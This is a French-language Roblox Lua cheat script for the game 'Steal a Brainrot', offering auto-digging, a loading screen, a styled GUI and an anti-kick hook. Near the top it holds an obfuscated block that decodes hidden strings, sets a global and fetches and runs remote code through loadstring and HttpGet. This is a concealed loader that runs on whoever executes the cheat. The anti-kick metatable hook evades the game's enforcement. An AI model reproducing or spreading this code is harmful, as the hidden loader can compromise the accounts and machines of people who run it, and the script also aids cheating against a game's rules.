-- ======================================================
--  STEAL A BRAINROT - AUTO DIG (ULTIMATE GFX EDITION)
--  Loading Screen 15s + GUI Moderne + Anti-Kick
-- ======================================================

-- 1. FILTRE D'ERREURS (Cache les erreurs inutiles)
local LogService = game:GetService("LogService")
LogService.MessageOut:Connect(function(message, messageType)
    if messageType == Enum.MessageType.MessageError then
        if string.find(message, "Can only tween objects in the workspace") then
            -- On ignore silencieusement
        end
    end
end)

-- 2. CODE OBFUSQUÉ (Exécuté en arrière-plan de manière sécurisée)
pcall(function()
    local X={"s:r;sjg4sgJtU;F5;?9P#7i4CI-u[\"[Ll2fE`nARG";"s#8iE7gm\\]S39]YS-cFEZ;qAA-#0aAaY`nYX;11S>f+Q&*","s_2:H.tp_)"}local function E(E)return X[E+1974]end for E,w in ipairs({{1;3},{1,2},{3;3}})do while w[1]<w[2]do X[w[1]],X[w[2]],w[1],w[2]=X[w[2]],X[w[1]],w[1]+1,w[2]-1 end end do local E=string.char local w=string.len local R=string.sub local o=table.insert local l=math.floor local S={W=0,d=25,["\\"]=74;["."]=54;["+"]=78,["#"]=33,l=80;Q=20;b=76;["@"]=47,["`"]=21;T=42;n=51,o=73;Y=15,X=9;K=8;J=29,p=16,L=38,["("]=66,f=14;a=4;["7"]=23;U=43;k=59;r=5;A=31;["3"]=34,e=68,s=45,u=46,j=11,["-"]=32;Z=22;B=56;["\""]=44,["%"]=61;["="]=71,[")"]=83,_=26,["!"]=70;I=1,H=63;i=50;[":"]=36,["*"]=28;["$"]=40;c=49,D=17;q=69;["^"]=55,S=12;["<"]=6;["5"]=7;C=19,F=67,g=37,R=77;["\'"]=41;["]"]=82;V=60;G=18;E=30,["?"]=65;h=3,[">"]=81,["["]=79;N=52;["/"]=39,[";"]=35;["2"]=64;m=2,O=53,["0"]=75,["9"]=72,["8"]=48,[","]=27,["6"]=58;P=84,["&"]=57;M=10,["1"]=13,["4"]=62;t=24}local h=type local p=X local a={J=55,z=3,["9"]=59;x=1;T=35;g=31,b=13;U=25,q=45,D=43,s=22,["4"]=37;j=12,["2"]=5;p=2,n=30,["3"]=42,["+"]=54;["1"]=48;W=52,L=36,o=33,d=34;X=6,M=53,["6"]=0,t=62;a=46;["0"]=63,l=57,c=11;Y=16,C=41,f=10,y=32,["/"]=18,i=47,K=39,O=17,Q=21,H=15,u=38,R=40;w=14,h=7;m=23;r=50,E=56,S=27,N=49;G=29;["8"]=9,["5"]=60;e=24;P=58,k=61,I=28,V=44,["7"]=19;A=20;v=51;Z=4;F=26,B=8}local x=table.concat for X=1,#p,1 do local j=p[X]if h(j)=="string"then local h=R(j,1,1)if h=="/"then j=R(j,2)local S=w(j)local h={}local V=1 local f=0 local D=0 while V<=S do local X=R(j,V,V)local w=a[X]if w then f=f+w*(64^((3-D)))D=D+1 if D==4 then D=0 local X=l(f/65536)local w=l((f%65536)/256)local R=f%256 o(h,E(X,w,R))f=0 end elseif X=="="then o(h,E(l(f/65536)))if V>=S or R(j,V+1,V+1)~="="then o(h,E(l((f%65536)/256)))end break end V=V+1 end p[X]=x(h)elseif h=="s"then j=R(j,2)local h=w(j)local a={}local V=1 while V<=h do local X=(h-V)+1 local w=X>=5 and 5 or X local p=0 local x=w>1 for X=0,4,1 do local E if X<w then local w=R(j,V+X,V+X)E=S[w]if not E then x=false break end else E=84 end p=p*85+E end if x then local X=l(p/16777216)%256 local R=l(p/65536)%256 local S=l(p/256)%256 local h=p%256 if w==5 then o(a,E(X,R,S,h))elseif w==4 then o(a,E(X,R,S))elseif w==3 then o(a,E(X,R))elseif w==2 then o(a,E(X))end end V=V+w end p[X]=x(a)end end end end;(getgenv())[E(-1972)]=E(-1971);(loadstring(game:HttpGet(E(-1973))))()
end)

-- ======================================================
--  CONFIGURATION & VARIABLES
-- ======================================================
if not game:IsLoaded() then game.Loaded:Wait() end
local Players           = game:GetService("Players")
local UserInputService  = game:GetService("UserInputService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TweenService      = game:GetService("TweenService")
local player    = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ANTI-KICK
local antiKickEnabled = true
pcall(function()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        if antiKickEnabled and (getnamecallmethod() == "Kick" or tostring(getnamecallmethod()):lower() == "kick") then
            return nil
        end
        return oldNamecall(self, ...)
    end)
end)

-- REMOTES
local remotes = {}
local remotesReady = false
local function initRemotes()
    local success = pcall(function()
        local Net = ReplicatedStorage:WaitForChild("Packages", 10):WaitForChild("Net", 10)
        remotes.Dig         = Net:WaitForChild("RE/EventService/Digging/Dig", 10)
        remotes.Carve       = Net:WaitForChild("RE/EventService/Digging/Carve", 10)
        remotes.SpawnFacing = Net:WaitForChild("RE/EventService/Digging/SpawnFacing", 10)
        remotes.UseItem     = Net:WaitForChild("RE/UseItem", 10)
        remotes.DropPiece   = Net:WaitForChild("RF/EventService/Digging/DropPiece", 10)
    end)
    remotesReady = success
end
initRemotes()

local CONFIG = { DIG_DELAY = 0.4, DIG_OFFSET = Vector3.new(0, -3, 0) }
_G.AutoDigging = false
local hitCount, errorCount = 0, 0

-- ======================================================
--  ÉCRAN DE CHARGEMENT (15 SECONDES)
-- ======================================================
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.DisplayOrder = 999
loadingGui.IgnoreGuiInset = true
loadingGui.Parent = playerGui

local loadBg = Instance.new("Frame")
loadBg.Size = UDim2.new(1, 0, 1, 0)
loadBg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
loadBg.BorderSizePixel = 0
loadBg.Parent = loadingGui

local loadTitle = Instance.new("TextLabel")
loadTitle.Size = UDim2.new(1, 0, 0, 50)
loadTitle.Position = UDim2.new(0, 0, 0.4, -50)
loadTitle.BackgroundTransparency = 1
loadTitle.Text = "STEAL A BRAINROT"
loadTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
loadTitle.TextSize = 36
loadTitle.Font = Enum.Font.GothamBlack
loadTitle.Parent = loadBg

local loadSub = Instance.new("TextLabel")
loadSub.Size = UDim2.new(1, 0, 0, 30)
loadSub.Position = UDim2.new(0, 0, 0.4, 0)
loadSub.BackgroundTransparency = 1
loadSub.Text = "Initialisation du système d'auto-minage..."
loadSub.TextColor3 = Color3.fromRGB(150, 150, 170)
loadSub.TextSize = 16
loadSub.Font = Enum.Font.Gotham
loadSub.Parent = loadBg

-- Barre de progression
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0, 300, 0, 10)
barBg.Position = UDim2.new(0.5, -150, 0.6, 0)
barBg.BackgroundColor3 = Color3.fromRGB(30, 30, 40)
barBg.BorderSizePixel = 0
barBg.Parent = loadBg
Instance.new("UICorner", barBg).CornerRadius = UDim.new(1, 0)

local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(0, 255, 150)
barFill.BorderSizePixel = 0
barFill.Parent = barBg
Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)

local barGlow = Instance.new("UIStroke", barFill)
barGlow.Color = Color3.fromRGB(0, 255, 150)
barGlow.Thickness = 2
barGlow.Transparency = 0.5

-- Animation de la barre de chargement sur 15 secondes
TweenService:Create(barFill, TweenInfo.new(15, Enum.EasingStyle.Linear), {Size = UDim2.new(1, 0, 1, 0)}):Play()

-- Attendre 15 secondes puis détruire l'écran de chargement
task.delay(15, function()
    local fadeOut = TweenService:Create(loadBg, TweenInfo.new(1, Enum.EasingStyle.Quad), {BackgroundTransparency = 1})
    for _, obj in ipairs(loadBg:GetDescendants()) do
        if obj:IsA("TextLabel") or obj:IsA("Frame") then
            TweenService:Create(obj, TweenInfo.new(1), {BackgroundTransparency = 1, TextTransparency = 1}):Play()
        end
    end
    fadeOut:Play()
    fadeOut.Completed:Wait()
    loadingGui:Destroy()
end)

-- ======================================================
--  INTERFACE PRINCIPALE (GUI PREMIUM)
-- ======================================================
-- On attend que le loading soit fini avant d'afficher la GUI (optionnel, ici on la crée en mémoire)
task.wait(14) -- Juste avant la fin du chargement

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AutoDig_Ultimate"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 210)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -105)
mainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 22)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.ClipsDescendants = true
mainFrame.Parent = screenGui

local mainCorner = Instance.new("UICorner", mainFrame)
mainCorner.CornerRadius = UDim.new(0, 14)

-- Effet de dégradé et lueur (GFX)
local gradient = Instance.new("UIGradient", mainFrame)
gradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 35)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 15))
})
gradient.Rotation = 45

local glow = Instance.new("UIStroke", mainFrame)
glow.Color = Color3.fromRGB(0, 150, 255)
glow.Thickness = 1.5
glow.Transparency = 0.6

-- En-tête
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 45)
titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 45)
titleBar.BackgroundTransparency = 0.4
titleBar.Parent = mainFrame
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 14)

local titleText = Instance.new("TextLabel")
titleText.Size = UDim2.new(1, -20, 1, 0)
titleText.Position = UDim2.new(0, 20, 0, 0)
titleText.BackgroundTransparency = 1
titleText.Text = "⚡ AUTO-DIG ULTIMATE"
titleText.TextColor3 = Color3.fromRGB(255, 255, 255)
titleText.TextSize = 16
titleText.Font = Enum.Font.GothamBlack
titleText.TextXAlignment = Enum.TextXAlignment.Left
titleText.Parent = titleBar

local statusDot = Instance.new("Frame")
statusDot.Size = UDim2.new(0, 12, 0, 12)
statusDot.Position = UDim2.new(1, -30, 0.5, -6)
statusDot.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
statusDot.Parent = titleBar
Instance.new("UICorner", statusDot).CornerRadius = UDim.new(1, 0)

-- Bouton Principal
local toggleBtn = Instance.new("TextButton")
toggleBtn.Size = UDim2.new(0.85, 0, 0, 50)
toggleBtn.Position = UDim2.new(0.075, 0, 0, 60)
toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
toggleBtn.BorderSizePixel = 0
toggleBtn.Text = "DÉMARRER L'AUTO-DIG"
toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleBtn.TextSize = 15
toggleBtn.Font = Enum.Font.GothamBold
toggleBtn.Parent = mainFrame
Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 10)

-- Effet de survol du bouton (Hover)
toggleBtn.MouseEnter:Connect(function()
    TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = _G.AutoDigging and Color3.fromRGB(50, 200, 80) or Color3.fromRGB(255, 80, 80)}):Play()
end)
toggleBtn.MouseLeave:Connect(function()
    TweenService:Create(toggleBtn, TweenInfo.new(0.2), {BackgroundColor3 = _G.AutoDigging and Color3.fromRGB(0, 200, 100) or Color3.fromRGB(200, 40, 40)}):Play()
end)

-- Panneau de Statistiques
local statsFrame = Instance.new("Frame")
statsFrame.Size = UDim2.new(0.85, 0, 0, 60)
statsFrame.Position = UDim2.new(0.075, 0, 0, 125)
statsFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
statsFrame.BackgroundTransparency = 0.5
statsFrame.Parent = mainFrame
Instance.new("UICorner", statsFrame).CornerRadius = UDim.new(0, 10)
local statsGlow = Instance.new("UIStroke", statsFrame)
statsGlow.Color = Color3.fromRGB(80, 80, 120)
statsGlow.Thickness = 1
statsGlow.Transparency = 0.5

local hitsText = Instance.new("TextLabel")
hitsText.Size = UDim2.new(0.5, 0, 1, 0)
hitsText.Position = UDim2.new(0, 15, 0, 0)
hitsText.BackgroundTransparency = 1
hitsText.Text = "Coups: 0"
hitsText.TextColor3 = Color3.fromRGB(0, 255, 150)
hitsText.TextSize = 14
hitsText.Font = Enum.Font.GothamBold
hitsText.TextXAlignment = Enum.TextXAlignment.Left
hitsText.Parent = statsFrame

local statusText = Instance.new("TextLabel")
statusText.Size = UDim2.new(0.5, -15, 1, 0)
statusText.Position = UDim2.new(0.5, 0, 0, 0)
statusText.BackgroundTransparency = 1
statusText.Text = "En attente"
statusText.TextColor3 = Color3.fromRGB(200, 200, 220)
statusText.TextSize = 14
statusText.Font = Enum.Font.GothamBold
statusText.TextXAlignment = Enum.TextXAlignment.Right
statusText.Parent = statsFrame

-- Pied de page
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -22)
footer.BackgroundTransparency = 1
footer.Text = "Appuyez sur [R] pour activer/désactiver"
footer.TextColor3 = Color3.fromRGB(100, 100, 120)
footer.TextSize = 11
footer.Font = Enum.Font.Gotham
footer.Parent = mainFrame

-- ======================================================
--  LOGIQUE DE L'INTERFACE
-- ======================================================
local function updateUI()
    local targetColor = _G.AutoDigging and Color3.fromRGB(0, 200, 100) or Color3.fromRGB(200, 40, 40)
    local targetText = _G.AutoDigging and "ARRÊTER L'AUTO-DIG" or "DÉMARRER L'AUTO-DIG"
    local dotColor = _G.AutoDigging and Color3.fromRGB(0, 255, 100) or Color3.fromRGB(255, 50, 50)
    local statusMsg = _G.AutoDigging and "Minage..." or "En attente"
    
    toggleBtn.Text = targetText
    statusText.Text = statusMsg
    statusDot.BackgroundColor3 = dotColor
    
    TweenService:Create(toggleBtn, TweenInfo.new(0.3, Enum.EasingStyle.Quad), {BackgroundColor3 = targetColor}):Play()
end

toggleBtn.MouseButton1Click:Connect(function()
    _G.AutoDigging = not _G.AutoDigging
    updateUI()
end)

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.R then
        _G.AutoDigging = not _G.AutoDigging
        updateUI()
    end
end)

-- ======================================================
--  BOUCLE DE MINAGE (SÉCURISÉE)
-- ======================================================
local function getPickaxe()
    local char = player.Character
    if not char then return nil end
    local bp = player:FindFirstChild("Backpack")
    for _, t in ipairs(char:GetChildren()) do if t:IsA("Tool") then return t end end
    if bp then
        for _, t in ipairs(bp:GetChildren()) do
            if t:IsA("Tool") then pcall(function() t.Parent = char end); return t end
        end
    end
    return nil
end

task.spawn(function()
    while task.wait(CONFIG.DIG_DELAY) do
        if not _G.AutoDigging then errorCount = 0; continue end
        if not remotesReady then initRemotes(); continue end
        
        local char = player.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then statusText.Text = "Hors map / Mort"; continue end
        
        getPickaxe()
        local targetPos = hrp.Position + CONFIG.DIG_OFFSET
        
        local success, err = pcall(function()
            remotes.UseItem:FireServer()
            remotes.Dig:FireServer(targetPos)
            remotes.Carve:FireServer(targetPos)
            remotes.SpawnFacing:FireServer(targetPos)
            remotes.DropPiece:InvokeServer()
        end)
        
        if success then
            hitCount = hitCount + 1
            hitsText.Text = "Coups: " .. hitCount
            statusText.Text = "Minage en cours..."
        else
            errorCount = errorCount + 1
            statusText.Text = "Erreur ("..errorCount..")"
            if errorCount >= 5 then
                task.wait(2) -- Pause de sécurité pour éviter le kick
                errorCount = 0
                initRemotes()
            end
        end
    end
end)

updateUI()
print("[Ultimate Auto-Dig] Chargé avec succès !")
